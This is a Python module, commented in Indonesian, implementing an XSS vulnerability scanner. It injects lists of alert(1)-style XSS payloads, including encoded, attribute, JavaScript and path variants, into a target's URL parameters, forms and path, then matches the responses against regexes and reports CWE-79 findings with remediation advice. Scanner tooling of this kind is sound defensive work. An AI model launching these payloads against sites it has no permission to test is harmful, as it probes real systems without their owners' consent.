import asyncio
import re
import html
import urllib.parse
from typing import Dict, List, Any, Set, Tuple, Optional
import random
import string

from core.base_scanner import BaseScanner
from core.models import (
    HttpRequest, 
    HttpResponse, 
    VulnerabilityType, 
    VulnerabilitySeverity,
    Vulnerability
)


class XSSScanner(BaseScanner):
    """
    Cross-Site Scripting (XSS) vulnerability scanner.
    
    Scanner ini mendeteksi berbagai tipe kerentanan XSS dengan:
    1. Menguji parameter dengan payload XSS
    2. Menganalisis respons untuk melihat apakah payload dijalankan
    3. Mendeteksi reflected XSS dan beberapa tipe stored XSS
    4. Menggunakan payload yang berbeda untuk mengatasi filter
    """
    
    def __init__(self):
        super().__init__()
        self.name = "XSSScanner"
        self.description = "Mendeteksi kerentanan Cross-Site Scripting (XSS)"
        
        # Marker unik untuk mengidentifikasi payload XSS dalam respons
        self.xss_marker_template = "XSSMARK{}XSSMARK"
        
        # Payload dasar XSS
        self.basic_xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "><script>alert(1)</script>",
            "</script><script>alert(1)</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<a href=\"javascript:alert(1)\">klik</a>",
            "<div style=\"background-image: url(javascript:alert(1))\"></div>",
            "<div style=\"width: expression(alert(1))\">",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<object data=\"javascript:alert(1)\"></object>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>",
            "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=x onerror=alert(1)>\">",
            "<form action=\"javascript:alert(1)\"><button>klik</button></form>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "<input type=\"image\" src=\"javascript:alert(1)\">",
            "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
            "<table background=\"javascript:alert(1)\"></table>",
        ]
        
        # Payload XSS dengan encoding berbeda
        self.encoded_xss_payloads = [
            # URL encoded
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            # Double URL encoded
            "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
            # HTML encoded
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            # Hex escaped
            "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
            # Unicode escaped
            "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
            # Mixed encoding
            "<scr\\ipt>alert(1)</scr\\ipt>",
            # Base64
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]
        
        # Payload XSS untuk konteks khusus
        self.context_xss_payloads = {
            # Untuk konteks atribut HTML
            "attr": [
                "\" onmouseover=\"alert(1)",
                "\" onload=\"alert(1)",
                "\" onerror=\"alert(1)",
                "\" onfocus=\"alert(1)",
                "\" onclick=\"alert(1)",
                "\" onchange=\"alert(1)",
            ],
            # Untuk konteks JavaScript
            "js": [
                "'-alert(1)-'",
                "\"-alert(1)-\"",
                "\\'-alert(1)-\\'",
                "\\'-alert(1);\\'//'",
                "\\\";alert(1);//",
                "*/alert(1)/*",
            ],
            # Untuk CSS
            "css": [
                "</style><script>alert(1)</script>",
                "}</style><script>alert(1)</script>",
                "</style><img src=x onerror=alert(1)>",
            ],
            # Untuk path URL
            "url": [
                "/javascript:alert(1)",
                "/data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "/:alert(1)",
            ],
        }
        
        # Regex untuk mendeteksi injeksi XSS dalam respons
        self.xss_detection_patterns = [
            r'<script[^>]*>[^<]*alert\(\d+\)[^<]*</script>',
            r'<img[^>]*onerror\s*=\s*["\']?alert\(\d+\)["\']?[^>]*>',
            r'<svg[^>]*onload\s*=\s*["\']?alert\(\d+\)["\']?[^>]*>',
            r'<body[^>]*onload\s*=\s*["\']?alert\(\d+\)["\']?[^>]*>',
            r'javascript:alert\(\d+\)',
            r'<a[^>]*href\s*=\s*["\']?javascript:alert\(\d+\)["\']?[^>]*>',
        ]
        
        # Compile regex patterns
        self.xss_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.xss_detection_patterns]
    
    def _generate_xss_marker(self) -> str:
        """
        Generate a unique XSS marker.
        """
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return self.xss_marker_template.format(random_str)
    
    async def scan(self, target_url: str) -> List[Vulnerability]:
        """
        Scan URL target untuk kerentanan XSS.
        
        Args:
            target_url: URL yang akan dipindai
            
        Returns:
            Daftar kerentanan yang terdeteksi
        """
        self.logger.info(f"Memindai {target_url} untuk kerentanan XSS")
        
        # Hapus kerentanan sebelumnya
        self.clear_vulnerabilities()
        
        try:
            # Dapatkan respons awal
            request, response = await self.send_request(target_url)
            
            # Ekstrak parameter dari URL
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Uji parameter URL
            if query_params:
                await self._test_parameters(target_url, query_params)
            
            # Ekstrak dan uji form
            if response.body:
                forms = self.extract_forms(response.body, target_url)
                for form in forms:
                    await self._test_form(form, target_url)
            
            # Uji path URL (untuk XSS dalam path)
            if "/" in parsed_url.path:
                await self._test_path(target_url)
            
        except Exception as e:
            self.logger.error(f"Error memindai {target_url}: {str(e)}")
        
        return self.vulnerabilities
    
    async def _test_parameters(self, url: str, params: Dict[str, List[str]]) -> None:
        """
        Uji parameter URL untuk kerentanan XSS.
        
        Args:
            url: URL dasar
            params: Dictionary parameter URL
        """
        self.logger.debug(f"Menguji {len(params)} parameter dalam URL {url}")
        
        # Buat tugas untuk pengujian paralel
        tasks = []
        for param_name, param_values in params.items():
            param_value = param_values[0] if param_values else ''
            
            # Uji untuk reflected XSS
            tasks.append(self._test_reflected_xss(url, param_name, param_value))
        
        # Jalankan semua tes secara paralel
        await asyncio.gather(*tasks)
    
    async def _test_form(self, form: Dict[str, Any], base_url: str) -> None:
        """
        Uji input form untuk kerentanan XSS.
        
        Args:
            form: Data form
            base_url: URL dasar dari halaman yang berisi form
        """
        form_action = form.get('action', '')
        form_method = form.get('method', 'GET')
        inputs = form.get('inputs', [])
        
        self.logger.debug(f"Menguji form dengan action {form_action} dan method {form_method}")
        
        if not inputs:
            return
        
        # Buat pengajuan form dasar dengan nilai asli
        form_data = {}
        for input_field in inputs:
            field_name = input_field.get('name', '')
            field_value = input_field.get('value', '')
            if field_name:
                form_data[field_name] = field_value
        
        # Uji setiap bidang input
        tasks = []
        for input_field in inputs:
            field_name = input_field.get('name', '')
            field_value = input_field.get('value', '')
            field_type = input_field.get('type', 'text')
            
            # Lewati hidden, checkbox, radio, dll.
            if field_type not in ['text', 'search', 'url', 'tel', 'email', 'password', 'textarea']:
                continue
            
            # Buat tugas untuk pengujian paralel
            target_url = form_action or base_url
            if form_method.upper() == 'GET':
                tasks.append(self._test_reflected_xss(target_url, field_name, field_value, method='GET', form_data=form_data.copy()))
            else:  # POST
                tasks.append(self._test_reflected_xss(target_url, field_name, field_value, method='POST', form_data=form_data.copy()))
        
        # Jalankan semua tes secara paralel
        await asyncio.gather(*tasks)
    
    async def _test_path(self, url: str) -> None:
        """
        Uji path URL untuk kerentanan XSS.
        
        Args:
            url: URL target
        """
        parsed_url = urllib.parse.urlparse(url)
        path_parts = parsed_url.path.split('/')
        
        # Lewati jika tidak ada bagian path yang cukup
        if len(path_parts) <= 1:
            return
        
        for i in range(1, len(path_parts)):
            # Salin parts dan ganti satu part dengan payload
            for payload in self.context_xss_payloads['url']:
                new_path_parts = path_parts.copy()
                new_path_parts[i] = payload
                
                # Buat URL baru dengan path yang dimodifikasi
                new_path = '/'.join(new_path_parts)
                new_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    new_path,
                    parsed_url.params,
                    parsed_url.query,
                    parsed_url.fragment
                ))
                
                try:
                    # Kirim permintaan
                    request, response = await self.send_request(new_url)
                    
                    # Periksa jika XSS berhasil
                    if self._is_xss_successful(response.body, payload):
                        self.add_vulnerability(
                            name="Path-Based XSS",
                            description=f"Kerentanan Path-based XSS terdeteksi dalam segmen path {i}",
                            vuln_type=VulnerabilityType.XSS,
                            severity=VulnerabilitySeverity.HIGH,
                            request=request,
                            response=response,
                            evidence=self._extract_xss_evidence(response.body, payload),
                            payload=payload,
                            cwe_id=79,  # CWE-79: Improper Neutralization of Input During Web Page Generation
                            remediation="Pastikan untuk melakukan escape dan memvalidasi segmen path URL. Gunakan fungsi encoding HTML untuk output."
                        )
                        
                        self.logger.info(f"Path-based XSS terdeteksi dalam segmen path {i} di {url}")
                        return
                except Exception as e:
                    self.logger.error(f"Error menguji path dengan payload {payload}: {str(e)}")
    
    async def _test_reflected_xss(self, url: str, param_name: str, param_value: str, 
                                 method: str = 'GET', form_data: Dict[str, str] = None) -> None:
        """
        Uji untuk reflected XSS.
        
        Args:
            url: URL target
            param_name: Nama parameter yang diuji
            param_value: Nilai parameter asli
            method: Metode HTTP
            form_data: Data form untuk permintaan POST
        """
        # Gabungkan semua payload yang akan diuji
        all_payloads = self.basic_xss_payloads + self.encoded_xss_payloads
        all_payloads += self.context_xss_payloads['attr'] + self.context_xss_payloads['js']
        
        for payload in all_payloads:
            # Buat marker unik untuk setiap permintaan
            marker = self._generate_xss_marker()
            marked_payload = payload.replace("alert(1)", f"alert('{marker}')")
            
            # Siapkan data permintaan
            test_data = form_data.copy() if form_data else {}
            test_data[param_name] = marked_payload
            
            # Kirim permintaan
            try:
                if method == 'GET':
                    # Bangun URL dengan parameter
                    parsed_url = urllib.parse.urlparse(url)
                    query_dict = dict(urllib.parse.parse_qsl(parsed_url.query))
                    query_dict.update(test_data)
                    
                    # Rekonstruksi URL
                    new_query = urllib.parse.urlencode(query_dict)
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme, 
                        parsed_url.netloc, 
                        parsed_url.path, 
                        parsed_url.params, 
                        new_query, 
                        parsed_url.fragment
                    ))
                    
                    request, response = await self.send_request(new_url, method='GET')
                else:  # POST
                    request, response = await self.send_request(url, method='POST', data=test_data)
                
                # Periksa jika XSS berhasil
                if self._is_xss_successful(response.body, payload, marker):
                    # Tentukan jenis XSS dan tingkat keparahan
                    xss_type = "Reflected XSS"
                    severity = VulnerabilitySeverity.HIGH
                    
                    # Tambahkan kerentanan
                    self.add_vulnerability(
                        name=xss_type,
                        description=f"Kerentanan {xss_type} terdeteksi dalam parameter {param_name}",
                        vuln_type=VulnerabilityType.XSS,
                        severity=severity,
                        request=request,
                        response=response,
                        evidence=self._extract_xss_evidence(response.body, payload, marker),
                        payload=marked_payload,
                        cwe_id=79,  # CWE-79: Improper Neutralization of Input During Web Page Generation
                        remediation="Gunakan fungsi encoding HTML seperti htmlentities() atau framework yang secara otomatis melakukan escape output. Terapkan Content-Security-Policy (CSP) untuk mengurangi dampak."
                    )
                    
                    # Catat temuan
                    self.logger.info(f"{xss_type} terdeteksi dalam {param_name} di {url}")
                    return
                    
            except Exception as e:
                self.logger.error(f"Error menguji {param_name} dengan payload {payload}: {str(e)}")
    
    def _is_xss_successful(self, response_body: str, payload: str, marker: Optional[str] = None) -> bool:
        """
        Periksa apakah injeksi XSS berhasil.
        
        Args:
            response_body: Badan respons untuk diperiksa
            payload: Payload XSS yang digunakan
            marker: Marker unik untuk mengidentifikasi payload
            
        Returns:
            True jika XSS berhasil, False jika tidak
        """
        if not response_body:
            return False
        
        # Jika ada marker, cari dalam respons
        if marker and marker in response_body:
            # Marker muncul, tetapi kita perlu memverifikasi bahwa ini dalam konteks JavaScript
            marker_pos = response_body.find(marker)
            surrounding = response_body[max(0, marker_pos - 50):min(len(response_body), marker_pos + 50)]
            
            # Periksa jika marker muncul dalam konteks JavaScript alert()
            if "alert" in surrounding and "script" in surrounding:
                return True
        
        # Periksa jika payload asli (atau bagian dari itu) muncul tanpa di-escape
        # Pertama, hilangkan encoding HTML sederhana
        unescaped_body = html.unescape(response_body)
        
        # Hapus atribut yang mungkin berubah (seperti marker dalam alert)
        normalized_payload = re.sub(r'alert\([^)]*\)', 'alert', payload)
        
        # Jika payload utuh muncul dalam respons
        if normalized_payload in unescaped_body:
            # Verifikasi tambahan bahwa ini tidak hanya ditampilkan sebagai teks
            # Cari tag yang diawali <script atau atribut event seperti onerror=
            surrounding = unescaped_body[max(0, unescaped_body.find(normalized_payload) - 50):
                                        min(len(unescaped_body), unescaped_body.find(normalized_payload) + len(normalized_payload) + 50)]
            
            if "<script" in surrounding.lower() or "on" in surrounding.lower() and "=" in surrounding:
                return True
        
        # Gunakan regex pattern untuk mendeteksi bentuk XSS lainnya
        for pattern in self.xss_patterns:
            if pattern.search(response_body):
                return True
        
        return False
    
    def _extract_xss_evidence(self, response_body: str, payload: str, marker: Optional[str] = None) -> str:
        """
        Ekstrak bukti XSS dari badan respons.
        
        Args:
            response_body: Badan respons
            payload: Payload XSS yang digunakan
            marker: Marker unik untuk mengidentifikasi payload
            
        Returns:
            Bukti yang diekstrak atau string kosong
        """
        if not response_body:
            return ""
        
        # Jika ada marker, cari dalam respons
        if marker and marker in response_body:
            marker_pos = response_body.find(marker)
            start = max(0, marker_pos - 100)
            end = min(len(response_body), marker_pos + 100)
            return f"...{response_body[start:end]}..."
        
        # Jika tidak ada marker, cari payload asli
        unescaped_body = html.unescape(response_body)
        normalized_payload = re.sub(r'alert\([^)]*\)', 'alert', payload)
        
        if normalized_payload in unescaped_body:
            payload_pos = unescaped_body.find(normalized_payload)
            start = max(0, payload_pos - 100)
            end = min(len(unescaped_body), payload_pos + len(normalized_payload) + 100)
            return f"...{unescaped_body[start:end]}..."
        
        # Cari menggunakan regex patterns
        for pattern in self.xss_patterns:
            match = pattern.search(response_body)
            if match:
                start = max(0, match.start() - 100)
                end = min(len(response_body), match.end() + 100)
                return f"...{response_body[start:end]}..."
        
        return "Bukti tidak dapat diekstrak" 